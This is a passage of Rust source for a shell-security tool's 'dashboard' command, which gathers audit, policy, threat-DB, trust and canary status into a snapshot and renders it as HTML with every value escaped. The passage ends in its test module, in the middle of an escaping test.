//! M13 ch3 — `tirith dashboard` snapshot model + self-contained HTML renderer.
//!
//! Assembles a [`DashboardSnapshot`] (pure serde data, no HTML) from read-only
//! sources (audit log, policy, threat DB, trust/canary stores, caller-supplied
//! shell-hook state — each degrades to "unavailable"), then renders it into a
//! static self-contained HTML report from an embedded template.
//!
//! # The escaping invariant (local-report XSS)
//!
//! Audit previews/paths are USER-CONTROLLED bytes; interpolating them raw is a
//! local-report XSS (a pasted `<script>…` would execute on open / loopback
//! `serve`). EVERY value substituted into the template passes through
//! [`html_escape`] — [`render_html`] has no raw-interpolation path. The snapshot
//! stores RAW strings; escaping happens only at the HTML boundary. `--json`
//! emits the raw snapshot (a re-rendering consumer owns its own escaping).

use std::collections::HashMap;
use std::path::Path;

use serde::{Deserialize, Serialize};

use crate::audit_aggregator::{self, AuditFilter, AuditRecord};

/// The default look-back window, in days, for the audit summary.
pub const DEFAULT_WINDOW_DAYS: i64 = 7;

/// How many top findings / hosts the snapshot surfaces.
const TOP_N: usize = 10;

/// The embedded HTML template — compiled in so the report is self-contained.
const TEMPLATE_HTML: &str = include_str!("../assets/dashboard/template.html");

/// A point-in-time, local-only security snapshot. Strings are stored RAW;
/// escaping is applied only when rendering HTML.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DashboardSnapshot {
    /// Stable schema version (bump on a breaking field change).
    pub schema_version: u32,
    /// RFC-3339 UTC timestamp this snapshot was assembled.
    pub generated_at: String,
    /// The audit look-back window in days.
    pub window_days: i64,
    /// RFC-3339 UTC lower bound of the window (`generated_at - window_days`).
    pub window_start: String,
    /// RFC-3339 UTC upper bound of the window (== `generated_at`).
    pub window_end: String,

    /// The 7-day audit summary, or `None` when the log is absent / unreadable.
    pub audit: Option<AuditSummary>,
    /// Policy summary (always present — an absent policy collapses to defaults).
    pub policy: PolicySummary,
    /// Threat-DB status (always present; `installed = false` when none).
    pub threatdb: ThreatDbSummary,
    /// Trust-store + canary summary (always present; counts may be zero).
    pub trust: TrustSummary,
    /// Shell-hook install state, supplied by the CLI caller.
    pub hook: HookSummary,
}

/// A 7-day audit summary distilled from the JSONL log.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditSummary {
    /// Verdict-bearing commands seen in the window.
    pub total_commands: usize,
    /// Total findings across those commands.
    pub total_findings: usize,
    /// Block rate in `[0.0, 1.0]`.
    pub block_rate: f64,
    /// Distinct sessions seen.
    pub sessions_seen: usize,
    /// Count by action (`Allow` / `Warn` / `Block` / …), sorted by action name.
    pub actions: Vec<(String, usize)>,
    /// Top rule IDs by occurrence (descending), capped at [`TOP_N`].
    pub top_findings: Vec<(String, usize)>,
    /// Top hosts by occurrence (descending), capped at [`TOP_N`]. Best-effort,
    /// from the REDACTED previews — may be empty even when commands were seen.
    pub top_hosts: Vec<(String, usize)>,
    /// Audit lines that failed to parse (surfaced so a corrupt log is visible).
    pub skipped_lines: usize,
}

/// Effective policy values when a policy resolved (built-in defaults or a
/// parsed file, both with user/org/trust overlays applied). `#[serde(flatten)]`
/// into [`PolicySummary::NoFile`]/[`Valid`] so `--json` carries them at the same
/// level as before, under a `state` tag.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicyValues {
    /// Paranoia tier (1–4).
    pub paranoia: u8,
    /// `"open"` or `"closed"`.
    pub fail_mode: String,
    /// Number of allowlist entries (flat patterns), including overlays.
    pub allowlist_count: usize,
    /// Number of rule-scoped allowlist entries, including overlays.
    pub allowlist_rules_count: usize,
    /// Number of blocklist entries, including overlays.
    pub blocklist_count: usize,
    /// Number of custom rules.
    pub custom_rules_count: usize,
}

/// Summary of the effective discovered policy.
///
/// Three states so the dashboard never presents a BROKEN policy as benign
/// defaults (the "fail-open lie" — CodeRabbit M13 PR #132 R5-1). An enum rather
/// than a flat struct of `Option`s makes the contradictory state (an `error`
/// ALONGSIDE populated counts) UNREPRESENTABLE: `ParseError` has no numeric
/// fields, since a policy that did not load has no known paranoia/counts.
///
/// serde: internally tagged on a snake_cased `state` discriminator; `NoFile`/
/// `Valid` `#[serde(flatten)]` their [`PolicyValues`] so the numeric fields sit
/// at the top level of the `policy` object as before the enum.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "state", rename_all = "snake_case")]
pub enum PolicySummary {
    /// No local policy file discovered — genuine built-in defaults + overlays.
    NoFile {
        #[serde(flatten)]
        values: PolicyValues,
    },
    /// A local policy file parsed successfully.
    Valid {
        path: String,
        #[serde(flatten)]
        values: PolicyValues,
    },
    /// A policy file is present but unparseable — the fail-closed state, no
    /// numeric values by construction.
    ParseError { path: String, error: String },
}

/// Threat-DB status, mirroring `tirith threat-db status`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatDbSummary {
    /// A DB file is present and loaded.
    pub installed: bool,
    /// Expected / actual DB path.
    pub path: Option<String>,
    /// Age of the DB in hours (when installed).
    pub age_hours: Option<f64>,
    /// DB build sequence (when installed).
    pub build_sequence: Option<u64>,
    /// Total records across all sections (when installed).
    pub total_entries: Option<u64>,
    /// Ed25519 signature verified (when installed).
    pub signature_valid: Option<bool>,
    /// Load/parse error, if the DB exists but could not be read.
    pub error: Option<String>,
}

/// Trust-store + canary summary.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrustSummary {
    /// Non-expired trust entries in the USER store (`config_dir()/trust.json`).
    pub user_trust_count: usize,
    /// Non-expired trust entries in the REPO store (`.tirith/trust.json`).
    pub repo_trust_count: usize,
    /// Registered canary tokens.
    pub canary_count: usize,
    /// Canary tokens with an opt-in callback URL configured.
    pub canary_with_callback: usize,
}

/// Shell-hook install state. Populated by the CLI caller; core never detects
/// or materializes hooks.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookSummary {
    /// The detected interactive shell (e.g. `"zsh"`), or `"unknown"`.
    pub shell: String,
    /// The hook line is present in the shell's profile.
    pub installed: bool,
}

/// Assemble a [`DashboardSnapshot`]. `audit_log` `None` uses the default path;
/// `cwd` `None` uses the process cwd for policy/trust discovery (walks to
/// `.git`); `hook` is the caller's read-only probe. Read-only — never writes.
pub fn build_snapshot(
    audit_log: Option<&Path>,
    cwd: Option<&str>,
    hook: HookSummary,
) -> DashboardSnapshot {
    let now = chrono::Utc::now();
    let window_start = now - chrono::Duration::days(DEFAULT_WINDOW_DAYS);

    let audit = build_audit_summary(audit_log, &window_start.to_rfc3339(), &now.to_rfc3339());
    let policy = build_policy_summary(cwd);
    let threatdb = build_threatdb_summary();
    let trust = build_trust_summary(cwd);

    DashboardSnapshot {
        schema_version: 1,
        generated_at: now.to_rfc3339(),
        window_days: DEFAULT_WINDOW_DAYS,
        window_start: window_start.to_rfc3339(),
        window_end: now.to_rfc3339(),
        audit,
        policy,
        threatdb,
        trust,
        hook,
    }
}

/// Build the 7-day audit summary. Returns `None` when no log path resolves or
/// the file cannot be read (a fresh install with no log is the common case).
fn build_audit_summary(audit_log: Option<&Path>, since: &str, until: &str) -> Option<AuditSummary> {
    let path = match audit_log {
        Some(p) => p.to_path_buf(),
        None => crate::audit::audit_log_path()?,
    };
    // HARDENED READ (CodeRabbit M13 PR #132): the (possibly caller-supplied)
    // log path goes through race-free `read_regular_capped` (O_NONBLOCK +
    // fstat-the-open-fd + size cap) so a symlink-to-/dev/zero or unbounded log
    // can't hang/OOM the render, then `parse_log` for the same malformed-line
    // accounting as `read_log`. Any read error degrades to `None`.
    let bytes = crate::util::read_regular_capped(&path, AUDIT_READ_CAP).ok()?;
    let content = String::from_utf8(bytes).ok()?;
    let read = audit_aggregator::parse_log(&content, Some(&path));

    let filter = AuditFilter {
        since: Some(since.to_string()),
        until: Some(until.to_string()),
        entry_type: Some("verdict".to_string()),
        ..Default::default()
    };
    let windowed = audit_aggregator::filter_records(&read.records, &filter);
    let stats = audit_aggregator::compute_stats(&windowed);

    let mut actions: Vec<(String, usize)> = stats.actions.into_iter().collect();
    actions.sort_by(|a, b| a.0.cmp(&b.0));

    let top_hosts = top_hosts(&windowed);

    Some(AuditSummary {
        total_commands: stats.total_commands,
        total_findings: stats.total_findings,
        block_rate: stats.block_rate,
        sessions_seen: stats.sessions_seen,
        actions,
        top_findings: stats.top_rules,
        top_hosts,
        skipped_lines: read.skipped_lines,
    })
}

/// Best-effort top-hosts tally from the REDACTED previews. Intentionally lossy
/// (the field is DLP-redacted + truncated to 80 bytes). Reuses the engine's own
/// URL extractor + host parser so "a host" matches the rest of tirith.
fn top_hosts(records: &[AuditRecord]) -> Vec<(String, usize)> {
    let mut counts: HashMap<String, usize> = HashMap::new();
    for r in records {
        let urls =
            crate::extract::extract_urls(&r.command_redacted, crate::tokenize::ShellType::Posix);
        for u in urls {
            if let Some(host) = u.parsed.host() {
                let host = host.trim().to_ascii_lowercase();
                if !host.is_empty() {
                    *counts.entry(host).or_insert(0) += 1;
                }
            }
        }
    }
    let mut hosts: Vec<(String, usize)> = counts.into_iter().collect();
    // Descending count, then host name, for a deterministic order.
    hosts.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
    hosts.truncate(TOP_N);
    hosts
}

/// Read cap for the discovered local policy file (a small hand-authored doc).
const POLICY_READ_CAP: u64 = 1024 * 1024;

/// Read cap for the JSONL audit log. Larger (64 MiB) since the log is
/// machine-written, append-only, and unrotated; bounds the in-memory buffer
/// (and won't block on a FIFO / follow a symlink to a device). An over-cap log
/// degrades to an empty audit summary.
const AUDIT_READ_CAP: u64 = 64 * 1024 * 1024;

/// Read cap for a `trust.json` store (the dashboard only counts entries).
const TRUST_READ_CAP: u64 = 1024 * 1024;

/// Render a [`crate::util::OpenRegularError`] as a short reason for the policy
/// `error` state (the type has no `Display` impl).
fn open_error_text(e: &crate::util::OpenRegularError) -> String {
    match e {
        crate::util::OpenRegularError::NotFound => "file not found".to_string(),
        crate::util::OpenRegularError::NotRegularFile => {
            "not a regular file (FIFO, device, socket, or directory)".to_string()
        }
        crate::util::OpenRegularError::TooLarge => "exceeds read cap".to_string(),
        crate::util::OpenRegularError::Io(io) => io.to_string(),
    }
}

/// Summarize the EFFECTIVE policy the engine enforces, OFFLINE, while still
/// surfacing a broken LOCAL file rather than masking it as benign defaults.
///
/// Two concerns:
///
/// 1. Counts must match enforcement. `engine::analyze_inner` applies the local
///    policy PLUS the read-only overlays (`load_user_lists` + `load_org_lists` +
///    `load_trust_entries`, which APPEND to allow/block lists); summarizing only
///    the strict local parse under-reports them (CodeRabbit R6-1). We reproduce
///    that here via `discover_local_only` (NOT `discover`) so the render never
///    fetches a remote policy — the report promises "no network calls"
///    (CodeRabbit R9-2).
/// 2. A broken local file must not read as safe defaults. `Policy::discover`
///    fails closed SILENTLY, so a malformed file would render as a populated
///    summary — the fail-open lie (CodeRabbit R5-1). So we additionally do a
///    STRICT local parse to DETECT it and set the `error` state.
///
/// States: broken file → `ParseError` (takes precedence); no file → defaults +
/// overlays; valid file → effective summary. Overlays are non-fatal (each
/// `load_*` is read-only and degrades internally).
fn build_policy_summary(cwd: Option<&str>) -> PolicySummary {
    // (1) Strict local parse FIRST — the ONLY hard-error state. A
    // present-but-unparseable file must surface as "unavailable", not the
    // populated summary `Policy::discover`'s fail-closed default would present.
    if let Some(path) = crate::policy::discover_local_policy_path(cwd) {
        let path_str = path.display().to_string();
        // HARDENED READ (CodeRabbit M13 PR #132 R23): the repo-controlled path
        // goes through race-free `read_regular_capped` (O_NONBLOCK + fstat +
        // cap) so a symlink-to-/dev/zero or multi-GiB file can't hang/OOM the
        // render. Its error maps into the same `policy_summary_error` state.
        let content = match crate::util::read_regular_capped(&path, POLICY_READ_CAP) {
            Ok(bytes) => match String::from_utf8(bytes) {
                Ok(s) => s,
                Err(e) => {
                    return policy_summary_error(
                        path_str,
                        format!("cannot read: not valid UTF-8: {e}"),
                    )
                }
            },
            Err(e) => {
                return policy_summary_error(
                    path_str,
                    format!("cannot read: {}", open_error_text(&e)),
                )
            }
        };
        if let Err(e) = crate::policy::Policy::try_parse_yaml(&content) {
            return policy_summary_error(path_str, e);
        }
    }

    // (2) File parsed (or absent): build the effective LOCAL policy as
    // `analyze_inner` does (local discovery + read-only overlays) so counts
    // match enforcement, but via `discover_local_only` so the dashboard never
    // fetches a remote policy (CodeRabbit M13 PR #132 R9-2). Still applies
    // incident-mode runtime overrides (a local concern).
    let mut policy = crate::policy::Policy::discover_local_only(cwd);
    policy.load_user_lists();
    policy.load_org_lists(cwd);
    policy.load_trust_entries(cwd);

    policy_summary_from(&policy, policy.path.clone())
}

/// Build the effective [`PolicyValues`] from a successfully-loaded policy
/// (built-in defaults or a parsed file, in both cases with overlays applied).
fn policy_values_from(policy: &crate::policy::Policy) -> PolicyValues {
    PolicyValues {
        paranoia: policy.paranoia,
        fail_mode: match policy.fail_mode {
            crate::policy::FailMode::Open => "open".to_string(),
            crate::policy::FailMode::Closed => "closed".to_string(),
        },
        allowlist_count: policy.allowlist.len(),
        allowlist_rules_count: policy.allowlist_rules.len(),
        blocklist_count: policy.blocklist.len(),
        custom_rules_count: policy.custom_rules.len(),
    }
}

/// Build a populated [`PolicySummary`]; a discovered `path` selects `Valid`,
/// its absence `NoFile` (built-in defaults).
fn policy_summary_from(policy: &crate::policy::Policy, path: Option<String>) -> PolicySummary {
    let values = policy_values_from(policy);
    match path {
        Some(path) => PolicySummary::Valid { path, values },
        None => PolicySummary::NoFile { values },
    }
}

/// Build the fail-closed [`PolicySummary::ParseError`] (no numeric values).
fn policy_summary_error(path: String, error: String) -> PolicySummary {
    PolicySummary::ParseError { path, error }
}

/// Summarize threat-DB status, mirroring `tirith threat-db status`. Degrades to
/// `installed = false` when no DB file is present.
fn build_threatdb_summary() -> ThreatDbSummary {
    use crate::threatdb::ThreatDb;

    let db_path = ThreatDb::default_path();
    let path_str = db_path.as_ref().map(|p| p.display().to_string());

    let exists = db_path.as_ref().map(|p| p.exists()).unwrap_or(false);
    if !exists {
        return ThreatDbSummary {
            installed: false,
            path: path_str,
            age_hours: None,
            build_sequence: None,
            total_entries: None,
            signature_valid: None,
            error: None,
        };
    }

    let path_ref = db_path.as_ref().expect("path exists when exists==true");
    match ThreatDb::load_from_path(path_ref, 0) {
        Ok(db) => {
            let sig_valid = db.verify_signature().is_ok();
            let stats = db.stats();
            let now = chrono::Utc::now().timestamp().max(0) as u64;
            let age_hours = now.saturating_sub(stats.build_timestamp) as f64 / 3600.0;
            let total = stats.package_count as u64
                + stats.hostname_count as u64
                + stats.ip_count as u64
                + stats.typosquat_count as u64
                + stats.popular_count as u64;
            ThreatDbSummary {
                installed: true,
                path: path_str,
                age_hours: Some(age_hours),
                build_sequence: Some(stats.build_sequence),
                total_entries: Some(total),
                signature_valid: Some(sig_valid),
                error: None,
            }
        }
        Err(e) => ThreatDbSummary {
            installed: true,
            path: path_str,
            age_hours: None,
            build_sequence: None,
            total_entries: None,
            signature_valid: None,
            error: Some(e.to_string()),
        },
    }
}

/// Minimal lenient `trust.json` shape for counting non-expired entries (so core
/// does not depend on the CLI crate's struct).
#[derive(Debug, Deserialize)]
struct TrustStoreFile {
    #[serde(default)]
    entries: Vec<TrustEntryFile>,
}

#[derive(Debug, Deserialize)]
struct TrustEntryFile {
    #[serde(default)]
    ttl_expires: Option<String>,
}

/// Count non-expired entries in a `trust.json` at `path`. A missing or
/// unparseable file counts as zero (degrade gracefully — never panic).
fn count_trust_entries(path: &Path) -> usize {
    count_trust_entries_at(path, chrono::Utc::now())
}

/// Inner of [`count_trust_entries`] with the comparison instant injected, so the
/// `>= now` boundary is deterministically testable.
fn count_trust_entries_at(path: &Path, now: chrono::DateTime<chrono::Utc>) -> usize {
    // HARDENED READ (CodeRabbit M13 PR #132 R23): the repo-controlled path goes
    // through race-free `read_regular_capped`; a non-regular/oversize/unreadable
    // file collapses to the same zero-count path a missing file takes.
    let Ok(bytes) = crate::util::read_regular_capped(path, TRUST_READ_CAP) else {
        return 0;
    };
    let Ok(content) = String::from_utf8(bytes) else {
        return 0;
    };
    let Ok(store) = serde_json::from_str::<TrustStoreFile>(&content) else {
        return 0;
    };
    store
        .entries
        .iter()
        .filter(|e| match &e.ttl_expires {
            None => true, // permanent
            Some(ts) => match chrono::DateTime::parse_from_rfc3339(ts) {
                // `>= now`, not `> now`: `merge_trust_store` only expires when
                // `expiry < now`, so `ttl_expires == now` is still active
                // (CodeRabbit M13 PR #132 R17-2).
                Ok(expiry) => expiry >= now,
                // Unparseable TTL = expired, matching runtime enforcement which
                // skips it; counting it active would overstate trust (R3-2).
                Err(_) => false,
            },
        })
        .count()
}

/// Summarize the trust stores + canary store. All sources degrade to zero when
/// absent.
fn build_trust_summary(cwd: Option<&str>) -> TrustSummary {
    let user_trust_count = crate::policy::config_dir()
        .map(|d| count_trust_entries(&d.join("trust.json")))
        .unwrap_or(0);

    let repo_trust_count = crate::policy::find_repo_root(cwd)
        .map(|root| count_trust_entries(&root.join(".tirith").join("trust.json")))
        .unwrap_or(0);

    let canaries = crate::canary::list();
    let canary_count = canaries.len();
    let canary_with_callback = canaries.iter().filter(|c| c.callback_url.is_some()).count();

    TrustSummary {
        user_trust_count,
        repo_trust_count,
        canary_count,
        canary_with_callback,
    }
}

// HTML rendering — the ONLY place snapshot strings cross into HTML.

/// Random bytes in a `serve` token before hex-encoding (32 bytes = 256 bits).
const SERVE_TOKEN_BYTES: usize = 32;

/// Generate a fresh ephemeral `tirith dashboard serve` token: [`SERVE_TOKEN_BYTES`]
/// of OS entropy (via `getrandom::fill`), lower-hex encoded. Returns `Err` if
/// entropy is unavailable rather than emit a guessable token (which would defeat
/// the loopback guard).
pub fn generate_serve_token() -> Result<String, String> {
    let mut buf = [0u8; SERVE_TOKEN_BYTES];
    getrandom::fill(&mut buf).map_err(|e| format!("OS RNG unavailable: {e}"))?;
    let mut hex = String::with_capacity(SERVE_TOKEN_BYTES * 2);
    for b in buf {
        use std::fmt::Write as _;
        let _ = write!(hex, "{b:02x}");
    }
    Ok(hex)
}

/// Escape the five HTML-breaking chars (`&`, `<`, `>`, `"`, `'`; `'` as the
/// numeric `&#x27;`). `&` MUST be escaped FIRST so a `&` introduced by a later
/// replacement isn't re-escaped into `&amp;lt;`.
pub fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

/// Render a [`DashboardSnapshot`] into a self-contained HTML report. EVERY
/// interpolated value passes through [`html_escape`]; no raw-interpolation path.
pub fn render_html(snap: &DashboardSnapshot) -> String {
    // Pre-escaped substitution table — the template fill is one uniform pass,
    // so no caller can add a "raw" entry.
    let block_rate = snap
        .audit
        .as_ref()
        .map(|a| format!("{:.1}%", a.block_rate * 100.0))
        .unwrap_or_else(|| "—".to_string());
    let (total_commands, total_findings, sessions_seen) = snap
        .audit
        .as_ref()
        .map(|a| {
            (
                a.total_commands.to_string(),
                a.total_findings.to_string(),
                a.sessions_seen.to_string(),
            )
        })
        .unwrap_or_else(|| ("—".to_string(), "—".to_string(), "—".to_string()));

    let subs: &[(&str, String)] = &[
        ("{{GENERATED_AT}}", html_escape(&snap.generated_at)),
        (
            "{{WINDOW_DAYS}}",
            html_escape(&snap.window_days.to_string()),
        ),
        ("{{WINDOW_START}}", html_escape(&snap.window_start)),
        ("{{WINDOW_END}}", html_escape(&snap.window_end)),
        ("{{TOTAL_COMMANDS}}", html_escape(&total_commands)),
        ("{{TOTAL_FINDINGS}}", html_escape(&total_findings)),
        ("{{BLOCK_RATE}}", html_escape(&block_rate)),
        ("{{SESSIONS_SEEN}}", html_escape(&sessions_seen)),
        ("{{ACTIVITY_SECTION}}", render_activity(&snap.audit)),
        (
            "{{TOP_FINDINGS_SECTION}}",
            render_count_table(
                snap.audit.as_ref().map(|a| a.top_findings.as_slice()),
                "Rule",
                "No findings recorded in this window.",
            ),
        ),
        (
            "{{TOP_HOSTS_SECTION}}",
            render_count_table(
                snap.audit.as_ref().map(|a| a.top_hosts.as_slice()),
                "Host",
                "No hosts extracted from the recorded commands in this window.",
            ),
        ),
        ("{{POLICY_SECTION}}", render_policy(&snap.policy)),
        ("{{THREATDB_SECTION}}", render_threatdb(&snap.threatdb)),
        ("{{TRUST_SECTION}}", render_trust(&snap.trust)),
        ("{{HOOK_SECTION}}", render_hook(&snap.hook)),
    ];

    expand_template(TEMPLATE_HTML, subs)
}

/// Expand `{{MARKER}}` placeholders in a SINGLE left-to-right pass over the
/// ORIGINAL template (never the growing output), so a substituted value that
/// itself contains a marker is emitted verbatim, never re-substituted
/// (CodeRabbit M13 R2). Values are pre-escaped by the caller. Unknown markers
/// are left intact.
fn expand_template(template: &str, subs: &[(&str, String)]) -> String {
    let mut out = String::with_capacity(template.len());
    let mut rest = template;
    while let Some(start) = rest.find("{{") {
        out.push_str(&rest[..start]);
        let after_open = &rest[start..];
        match after_open.find("}}") {
            Some(end) => {
                // Full `{{…}}` token (braces included) to match `subs` keys.
                let marker = &after_open[..end + 2];
                match subs.iter().find(|(m, _)| *m == marker) {
                    Some((_, value)) => out.push_str(value),
                    // Unknown marker: emit unchanged, never rescanned.
                    None => out.push_str(marker),
                }
                rest = &after_open[end + 2..];
            }
            None => {
                // No closing `}}` — remainder is literal template text.
                out.push_str(after_open);
                rest = "";
                break;
            }
        }
    }
    out.push_str(rest);
    out
}

/// A `<table>` of `(key, count)` rows, or an `unavailable`/`empty` note.
fn render_count_table(
    rows: Option<&[(String, usize)]>,
    key_header: &str,
    empty_msg: &str,
) -> String {
    match rows {
        None => format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape("Audit log unavailable — no data for this section.")
        ),
        Some([]) => format!("<p class=\"empty\">{}</p>", html_escape(empty_msg)),
        Some(rows) => {
            let mut s = format!(
                "<table><tr><th>{}</th><th>Count</th></tr>",
                html_escape(key_header)
            );
            for (k, count) in rows {
                s.push_str(&format!(
                    "<tr><td>{}</td><td>{}</td></tr>",
                    html_escape(k),
                    html_escape(&count.to_string()),
                ));
            }
            s.push_str("</table>");
            s
        }
    }
}

/// The action breakdown table (or an unavailable note when no audit log).
fn render_activity(audit: &Option<AuditSummary>) -> String {
    let Some(a) = audit else {
        return format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape("No audit log found. Once tirith logs activity it will appear here.")
        );
    };
    let mut s = String::new();
    if a.actions.is_empty() {
        s.push_str(&format!(
            "<p class=\"empty\">{}</p>",
            html_escape("No commands recorded in this window.")
        ));
    } else {
        s.push_str("<table><tr><th>Action</th><th>Count</th></tr>");
        for (action, count) in &a.actions {
            s.push_str(&format!(
                "<tr><td>{}</td><td>{}</td></tr>",
                html_escape(action),
                html_escape(&count.to_string()),
            ));
        }
        s.push_str("</table>");
    }
    if a.skipped_lines > 0 {
        s.push_str(&format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape(&format!(
                "{} audit line(s) could not be parsed and were skipped.",
                a.skipped_lines
            ))
        ));
    }
    s
}

/// The policy key/value block. The exhaustive `match` on [`PolicySummary`]
/// makes the fail-open lie impossible by construction: `ParseError` renders an
/// explicit "policy unavailable" notice and cannot reach the numeric block
/// (CodeRabbit M13 PR #132 R5-1). Path and error are HTML-escaped.
fn render_policy(p: &PolicySummary) -> String {
    let (values, path) = match p {
        PolicySummary::ParseError { path, error } => {
            return format!(
                "<p class=\"unavailable\">{} <code>{}</code> {} {}</p>",
                html_escape("Policy unavailable — the policy file at"),
                html_escape(path),
                html_escape("could not be loaded:"),
                html_escape(error),
            );
        }
        PolicySummary::NoFile { values } => (values, "(none — built-in defaults)".to_string()),
        PolicySummary::Valid { path, values } => (values, path.clone()),
    };
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Paranoia tier</span>{}</div>\
         <div><span class=\"k\">Fail mode</span>{}</div>\
         <div><span class=\"k\">Allowlist entries</span>{}</div>\
         <div><span class=\"k\">Allowlist rules</span>{}</div>\
         <div><span class=\"k\">Blocklist entries</span>{}</div>\
         <div><span class=\"k\">Custom rules</span>{}</div>\
         <div><span class=\"k\">Policy file</span><code>{}</code></div>\
         </div>",
        html_escape(&values.paranoia.to_string()),
        html_escape(&values.fail_mode),
        html_escape(&values.allowlist_count.to_string()),
        html_escape(&values.allowlist_rules_count.to_string()),
        html_escape(&values.blocklist_count.to_string()),
        html_escape(&values.custom_rules_count.to_string()),
        html_escape(&path),
    )
}

/// The threat-DB key/value block.
fn render_threatdb(t: &ThreatDbSummary) -> String {
    if !t.installed {
        let path = t.path.as_deref().unwrap_or("(unknown)");
        return format!(
            "<p class=\"unavailable\">{} <code>{}</code></p>",
            html_escape("Threat DB not installed — run `tirith threat-db update`. Expected at"),
            html_escape(path),
        );
    }
    if let Some(err) = &t.error {
        return format!(
            "<p class=\"unavailable\">{} {}</p>",
            html_escape("Threat DB present but could not be loaded:"),
            html_escape(err),
        );
    }
    let age = t
        .age_hours
        .map(|h| format!("{h:.1} h"))
        .unwrap_or_else(|| "—".to_string());
    let seq = t
        .build_sequence
        .map(|s| s.to_string())
        .unwrap_or_else(|| "—".to_string());
    let total = t
        .total_entries
        .map(|n| n.to_string())
        .unwrap_or_else(|| "—".to_string());
    let sig = match t.signature_valid {
        Some(true) => "<span class=\"pill pill-ok\">verified</span>".to_string(),
        Some(false) => "<span class=\"pill pill-warn\">unverified</span>".to_string(),
        None => html_escape("—"),
    };
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Build sequence</span>{}</div>\
         <div><span class=\"k\">Age</span>{}</div>\
         <div><span class=\"k\">Total entries</span>{}</div>\
         <div><span class=\"k\">Signature</span>{}</div>\
         </div>",
        html_escape(&seq),
        html_escape(&age),
        html_escape(&total),
        sig,
    )
}

/// The trust + canary key/value block.
fn render_trust(t: &TrustSummary) -> String {
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">User trust entries</span>{}</div>\
         <div><span class=\"k\">Repo trust entries</span>{}</div>\
         <div><span class=\"k\">Canary tokens</span>{}</div>\
         <div><span class=\"k\">Canaries with callback</span>{}</div>\
         </div>",
        html_escape(&t.user_trust_count.to_string()),
        html_escape(&t.repo_trust_count.to_string()),
        html_escape(&t.canary_count.to_string()),
        html_escape(&t.canary_with_callback.to_string()),
    )
}

/// The shell-hook status block.
fn render_hook(h: &HookSummary) -> String {
    let pill = if h.installed {
        "<span class=\"pill pill-ok\">installed</span>"
    } else {
        "<span class=\"pill pill-off\">not installed</span>"
    };
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Detected shell</span>{}</div>\
         <div><span class=\"k\">Hook status</span>{}</div>\
         </div>",
        html_escape(&h.shell),
        pill,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every env var that influences where `build_policy_summary` resolves
    /// config from (XDG / %APPDATA% / %LOCALAPPDATA% / HOME / USERPROFILE /
    /// TIRITH_*). A hermetic test must pin and restore EVERY one across OSes.
    const ENV_KEYS: [&str; 8] = [
        "XDG_CONFIG_HOME",
        "APPDATA",
        "LOCALAPPDATA",
        "HOME",
        "USERPROFILE",
        "TIRITH_POLICY_ROOT",
        "TIRITH_SERVER_URL",
        "TIRITH_API_KEY",
    ];

    /// RAII guard: on construction saves + overrides every [`ENV_KEYS`] var, on
    /// `Drop` restores them. Serialized by the caller's `TEST_ENV_LOCK`; bind to
    /// `let _env = …` so it lives for the whole test.
    struct DashboardEnvGuard {
        prev: Vec<(&'static str, Option<std::ffi::OsString>)>,
    }

    impl DashboardEnvGuard {
        /// Snapshot all [`ENV_KEYS`], then apply `overrides` (`Some` sets,
        /// `None`/unnamed removes) so the resolved env is fully caller-determined.
        fn apply(overrides: &[(&'static str, Option<&std::ffi::OsStr>)]) -> Self {
            let prev = ENV_KEYS.iter().map(|&k| (k, std::env::var_os(k))).collect();
            // SAFETY: env mutation is serialized by `TEST_ENV_LOCK`, which the
            // caller holds for the lifetime of this guard.
            unsafe {
                for &key in ENV_KEYS.iter() {
                    let ovr = overrides.iter().find(|(k, _)| *k == key);
                    match ovr {
                        Some((_, Some(value))) => std::env::set_var(key, value),
                        // None or unnamed → unset, so the host env can't bleed in.
                        _ => std::env::remove_var(key),
                    }
                }
            }
            Self { prev }
        }
    }

    impl Drop for DashboardEnvGuard {
        fn drop(&mut self) {
            // SAFETY: still serialized by `TEST_ENV_LOCK` held by the caller.
            unsafe {
                for (key, prev) in &self.prev {
                    match prev {
                        Some(v) => std::env::set_var(key, v),
                        None => std::env::remove_var(key),
                    }
                }
            }
        }
    }

    fn empty_snapshot() -> DashboardSnapshot {
        DashboardSnapshot {
            schema_version: 1,
            generated_at: "2026-05-31T00:00:00+00:00".into(),
            window_days: 7,
            window_start: "2026-05-24T00:00:00+00:00".into(),
            window_end: "2026-05-31T00:00:00+00:00".into(),
            audit: None,
            policy: PolicySummary::NoFile {
                values: PolicyValues {
                    paranoia: 1,
                    fail_mode: "open".into(),
                    allowlist_count: 0,
                    allowlist_rules_count: 0,
                    blocklist_count: 0,
                    custom_rules_count: 0,
                },
            },
            threatdb: ThreatDbSummary {
                installed: false,
                path: None,
                age_hours: None,
                build_sequence: None,
                total_entries: None,
                signature_valid: None,
                error: None,
            },
            trust: TrustSummary {
                user_trust_count: 0,
                repo_trust_count: 0,
                canary_count: 0,
                canary_with_callback: 0,
            },
            hook: HookSummary {
                shell: "zsh".into(),
                installed: false,
            },
        }
    }

    // Invariant A — HTML escaping: every interpolated value passes through
    // html_escape; a `<script>` payload must never render as a live tag.

    #[test]
    fn html_escape_orders_ampersand_first() {
        // `&` first, so a `<` that becomes `&lt;` is not re-escaped to `&amp;lt;`.
        assert_eq!(html_escape("a & b"), "a &amp; b");
        assert_eq!(html_escape("<tag>"), "&lt;tag&gt;");
        assert_eq!(html_escape("\"q\""), "&quot;q&quot;");
        assert_eq!(html_escape("it's"), "it&#x27;s");
